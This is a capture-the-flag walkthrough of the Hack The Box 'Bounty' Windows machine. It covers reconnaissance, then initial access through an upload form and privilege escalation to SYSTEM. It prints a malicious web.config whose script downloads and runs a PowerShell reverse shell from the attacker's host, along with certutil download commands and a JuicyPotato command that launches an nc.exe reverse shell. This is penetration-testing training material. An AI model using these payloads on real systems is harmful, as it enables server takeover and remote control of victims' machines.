---
title: Write-up Bounty on HTB
author: eMVee
date: 2023-05-03 19:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, ms15-051, file upload, web.config, SeImpersonatePrivilege, Potato, JuicyPotato]
render_with_liquid: false
---

If you're planning to take the Offensive Security Certified Professional (OSCP) exam, you'll need to build your ethical hacking skills and develop a solid methodology to succeed. One valuable resource for OSCP preparation is TJnull's list of vulnerable machines, which includes a variety of targets to help you practice and refine your techniques. In this post, we'll walk you through hacking the Bounty machine, available on the popular hacking platform Hack The Box (HTB).

To get started, you'll first need to set up a Virtual Private Network (VPN) connection with HTB. This will grant you access to their machines, including Bounty. Once connected, you can begin the penetration testing process.

## Getting started
Before we start hacking our way into this machine, we should create a project directory and assign the IP address of the target to variable in the terminal.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB/ 

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Bounty 

┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ myip      

    inet 127.0.0.1
    inet 10.0.2.15
    inet 10.10.14.44

┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ ip=10.129.199.36

```

## Enumeration
Let's see if the target is responding to a simple ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ ping $ip -c 3                                              
PING 10.129.199.36 (10.129.199.36) 56(84) bytes of data.
64 bytes from 10.129.199.36: icmp_seq=1 ttl=127 time=18.0 ms
64 bytes from 10.129.199.36: icmp_seq=2 ttl=127 time=19.9 ms
64 bytes from 10.129.199.36: icmp_seq=3 ttl=127 time=19.3 ms

--- 10.129.199.36 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2034ms
rtt min/avg/max/mdev = 18.025/19.082/19.915/0.787 ms
```
Based on the `ttl` value in the answer we can indicate that the target is probably running on a Windows Operating System.
Next we should run a port scan with nmap so we can idenitfy open ports and running services.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ nmap -sC -T4 $ip -p- -Pn                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 22:37 CEST
Nmap scan report for 10.129.199.36
Host is up (0.020s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty

Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds

```
There is only one port open.
- Port 80
    - HTTP

We did run a simple port scan what did result in less information. 
Next we should run a more advanced nmap port scan to see if we can identify more information.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip -Pn                       
[sudo] password for emvee: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 22:40 CEST
Nmap scan report for 10.129.199.36
Host is up (0.020s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   20.79 ms 10.10.14.1
2   20.96 ms 10.129.199.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.21 seconds

```
It looks like the machine is running a webserver with Microsoft-IIS/7.5
Based on this information and the information from Microsoft the target is probably running on Windows 7 or Windows 2008 server.
[https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis](https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis)

Let's run whatweb to see if we can identify something about the technologies used.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ whatweb http://$ip                             
http://10.129.199.36 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.129.199.36], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]

```
We did discover the IIS server with nmap, but now we have identified the ASP.NEt as well. We should add both to our notes.
* Microsoft IIS 7.5
* Powered by ASP.NET

Let's run nikto to see if we can identify any known vulnerabilities on the target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ nikto -h http://$ip     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.199.36
+ Target Hostname:    10.129.199.36
+ Target Port:        80
+ Start Time:         2023-04-13 22:42:54 (GMT2)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 2.0.50727
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 

```
We have discovered that asp.net version 2.0.50727 is used with nikto. So far we did not discover something we could exploit yet.
Let's visit the website in the browser to see if we can find something.
![Image](/assets/img/WriteUp/HTB/Bounty/Pasted image 20230413224534.png){: width="700" height="400" }

It is just a website with an image of Merlin the wizard.
We should try to enumerate directories and files on the target. One of the tools we can use is dirsearch.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ dirsearch -u http://$ip -e asp,aspx,txt,html,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2       
 (_||| _) (/_(_|| (_| ) 
 
Extensions: asp, aspx, txt, html, bak | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.129.199.36/_23-04-13_22-48-16.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-04-13_22-48-16.log

Target: http://10.129.199.36/

[22:48:16] Starting: 
[22:49:38] 301 -  158B  - /UploadedFiles  ->  http://10.129.199.36/UploadedFiles/
[22:50:00] 301 -  158B  - /uploadedFiles  ->  http://10.129.199.36/uploadedFiles/

```
We have discovered a directory `/UploadedFiles` but no files with extensions yet.
Let's run Feroxbuster, another awesome tool to enumerate files and directories.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ feroxbuster --url http://$ip -x aspx -x asp    

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.199.36
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [aspx, asp]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       32l       53w      630c http://10.129.199.36/
301      GET        2l       10w      158c http://10.129.199.36/aspnet_client => http://10.129.199.36/aspnet_client/
200      GET       22l       58w      941c http://10.129.199.36/transfer.aspx
301      GET        2l       10w      158c http://10.129.199.36/uploadedfiles => http://10.129.199.36/uploadedfiles/
301      GET        2l       10w      158c http://10.129.199.36/uploadedFiles => http://10.129.199.36/uploadedFiles/
301      GET        2l       10w      158c http://10.129.199.36/UploadedFiles => http://10.129.199.36/UploadedFiles/
200      GET       22l       58w      941c http://10.129.199.36/Transfer.aspx
301      GET        2l       10w      158c http://10.129.199.36/Aspnet_client => http://10.129.199.36/Aspnet_client/
301      GET        2l       10w      158c http://10.129.199.36/aspnet_Client => http://10.129.199.36/aspnet_Client/
200      GET       22l       58w      941c http://10.129.199.36/TRANSFER.aspx
301      GET        2l       10w      169c http://10.129.199.36/aspnet_client/system_web => http://10.129.199.36/aspnet_client/system_web/
301      GET        2l       10w      158c http://10.129.199.36/ASPNET_CLIENT => http://10.129.199.36/ASPNET_CLIENT/
301      GET        2l       10w      169c http://10.129.199.36/Aspnet_client/system_web => http://10.129.199.36/Aspnet_client/system_web/
301      GET        2l       10w      169c http://10.129.199.36/aspnet_Client/system_web => http://10.129.199.36/aspnet_Client/system_web/
301      GET        2l       10w      169c http://10.129.199.36/ASPNET_CLIENT/system_web => http://10.129.199.36/ASPNET_CLIENT/system_web/
[####################] - 6m   1170000/1170000 0s      found:15      errors:638    
[####################] - 3m     90000/90000   395/s   http://10.129.199.36 
[####################] - 3m     90000/90000   395/s   http://10.129.199.36/ 
[####################] - 3m     90000/90000   387/s   http://10.129.199.36/aspnet_client 
[####################] - 3m     90000/90000   384/s   http://10.129.199.36/uploadedfiles 
[####################] - 4m     90000/90000   375/s   http://10.129.199.36/uploadedFiles 
[####################] - 4m     90000/90000   359/s   http://10.129.199.36/UploadedFiles 
[####################] - 4m     90000/90000   353/s   http://10.129.199.36/Aspnet_client 
[####################] - 4m     90000/90000   357/s   http://10.129.199.36/aspnet_Client 
[####################] - 4m     90000/90000   373/s   http://10.129.199.36/aspnet_client/system_web 
[####################] - 3m     90000/90000   412/s   http://10.129.199.36/ASPNET_CLIENT 
[####################] - 3m     90000/90000   434/s   http://10.129.199.36/Aspnet_client/system_web 
[####################] - 2m     90000/90000   539/s   http://10.129.199.36/aspnet_Client/system_web 
[####################] - 1m     90000/90000   850/s   http://10.129.199.36/ASPNET_CLIENT/system_web 

```
There is a file called `transfer.aspx` on the webserver, let's visit it in the browser.
![Image](/assets/img/WriteUp/HTB/Bounty/Pasted image 20230413224940.png){: width="700" height="400" }

It looks like we can upload files here. We should copy the cmd asp file to our working directory and upload it to the webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .

```
Let's upload the file.

![Image](/assets/img/WriteUp/HTB/Bounty/Pasted image 20230413230835.png){: width="700" height="400" }

It looks like we cannot upload an ASPX file. We could consider uploading a `*.config` file with a call to our nishang reverse shell.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ nano web.config    

┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ cat web.config                 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.44/Invoke-PowerShellTcp.ps1')")
%>

```
In the nishang `Invoke-PowerShellTcp.ps1` file we should append the following line on the last row.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.44 -Port 4444
```

![Image](/assets/img/WriteUp/HTB/Bounty/Pasted image 20230414104529.png){: width="700" height="400" }

We should start a python webserver to host the nishang powershell script.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Next we should start our netcat listener.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ rlwrap nc -lvp 4444                                                                                           
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

Let's upload the malicous config file to the webserver.
![Image](/assets/img/WriteUp/HTB/Bounty/Pasted image 20230413231258.png){: width="700" height="400" }

The upload did work! Now  we should 
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.199.36 - - [14/Apr/2023 10:46:36] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

## Initial access
The `Invoke-PowerShellTcp.ps1` file has been downloaded, so we should check our netcat listener to see if we have a connection from our target.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ rlwrap nc -lvp 4444                                                                                           
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.199.36.
Ncat: Connection from 10.129.199.36:49164.
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>

```
It looks like we have a connection with our target. Let's check who we are and what privileges we have.
```
PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 


```
It looks like we have `SeImpersonatePrivilege` available. This might be interesting to launch a potato attack against the target.
```
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          4/13/2023, 11:36:33 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,583 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,594 MB
Virtual Memory: In Use:    501 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.199.36
                                 [02]: fe80::e8cc:6238:ca08:c026
                                 [03]: dead:beef::e8cc:6238:ca08:c026
PS C:\windows\system32\inetsrv> 

```
Let's change our working directory to a location where we are able to download files to.
```
PS C:\windows\system32\inetsrv> cd c:\users
PS C:\users> cd public\downloads
PS C:\users\public\downloads> 
```
Let's download the JuicyPotato file to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe         
--2023-04-14 10:56:20--  https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230414%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230414T085621Z&X-Amz-Expires=300&X-Amz-Signature=981876971acea3e8e4fbd241fad154de41664636da66bfff89c8760110c9b79d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=142582717&response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&response-content-type=application%2Foctet-stream [following]
--2023-04-14 10:56:20--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230414%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230414T085621Z&X-Amz-Expires=300&X-Amz-Signature=981876971acea3e8e4fbd241fad154de41664636da66bfff89c8760110c9b79d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=142582717&response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 347648 (340K) [application/octet-stream]
Saving to: ‘JuicyPotato.exe’

JuicyPotato.exe              100%[==============================================>] 339.50K  --.-KB/s    in 0.03s   

2023-04-14 10:56:21 (11.7 MB/s) - ‘JuicyPotato.exe’ saved [347648/347648]
```
Next we should upload a netcat binary. First we should find the binary on our Kali and copy it to our working directory and host it via our python webserver.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ locate nc.exe 
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe

┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .      

┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Let's try to download the netcat binary and JuicyPotato so we can run it for our privilege escalation..
```
PS C:\users\public\downloads> certutil -f -urlcache http://10.10.14.44/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\users\public\downloads> certutil -f -urlcache http://10.10.14.44/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

```
Now we have to start a new netcat listener. 
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ rlwrap nc -lvp 9998                                                             
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9998
Ncat: Listening on 0.0.0.0:9998

```

## Privilege escalation
Now we have to run the JuicyPotato binary to launch a reverse shell to our machine.
```
PS C:\users\public\downloads> .\JuicyPotato.exe -l 1337 -p c:\windows\System32\cmd.exe -a "/c c:\users\public\downloads\nc.exe -e cmd.exe 10.10.14.44 9998"-t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
PS C:\users\public\downloads> 

```
Afer running the exploit we should check the netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Bounty]
└─$ rlwrap nc -lvp 9998                                                             
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9998
Ncat: Listening on 0.0.0.0:9998
Ncat: Connection from 10.129.199.36.
Ncat: Connection from 10.129.199.36:49181.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```
We have a reverse shell from our target.  The last step is to capture the proof we pwned the system and capture the user and root flag.

```
C:\Windows\system32>whoami&&hostname&&ipconfig
whoami&&hostname&&ipconfig
nt authority\system
bounty

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::e8cc:6238:ca08:c026
   Link-local IPv6 Address . . . . . : fe80::e8cc:6238:ca08:c026%17
   IPv4 Address. . . . . . . . . . . : 10.129.199.36
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%17
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

C:\Windows\system32>cd c:\users\administrator\dekstop
cd c:\users\administrator\dekstop
The system cannot find the path specified.

C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>cd administrator
cd administrator

c:\Users\Administrator>cd desktop
cd desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of c:\Users\Administrator\Desktop

05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
04/13/2023  11:37 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,699,089,408 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
< HERE IS THE ROOT FLAG >

c:\Users\Administrator\Desktop>cd ../../
cd ../../

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of c:\Users

05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
05/31/2018  12:18 AM    <DIR>          Administrator
05/30/2018  04:44 AM    <DIR>          Classic .NET AppPool
05/30/2018  12:22 AM    <DIR>          merlin
05/30/2018  05:44 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  11,699,089,408 bytes free

c:\Users>cd merlin/desktop
cd merlin/desktop

c:\Users\merlin\Desktop>type user.txt
type user.txt
< HERE IS THE USER FLAG >
```

We have successfully hacked Bounty!